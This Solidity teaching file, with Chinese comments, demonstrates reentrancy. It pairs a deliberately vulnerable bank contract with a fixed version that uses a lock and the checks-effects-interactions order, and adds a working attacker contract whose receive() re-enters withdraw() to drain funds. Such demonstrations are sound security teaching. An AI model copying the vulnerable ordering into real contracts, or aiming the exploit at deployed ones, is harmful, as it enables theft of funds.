// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 存在重入漏洞的合约
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // 危险！存在重入漏洞
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // 先转账，后更新状态 - 这是错误的顺序！
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0;
    }
}

// 安全的银行合约
contract SecureBank {
    mapping(address => uint256) public balances;
    bool private locked;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // 安全的提现函数
    function withdraw() external noReentrant {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");
        
        // 检查-效果-交互模式：先更新状态
        balances[msg.sender] = 0;
        
        // 再进行外部调用
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit Withdrawal(msg.sender, amount);
    }
}

// 攻击合约
contract Attacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackCount;
    
    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }
    
    // 接收以太币时触发重入攻击
    receive() external payable {
        if (attackCount < 3 && address(vulnerableBank).balance > 0) {
            attackCount++;
            vulnerableBank.withdraw();
        }
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        attackCount = 0;
        
        // 先存款
        vulnerableBank.deposit{value: msg.value}();
        
        // 发起攻击
        vulnerableBank.withdraw();
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}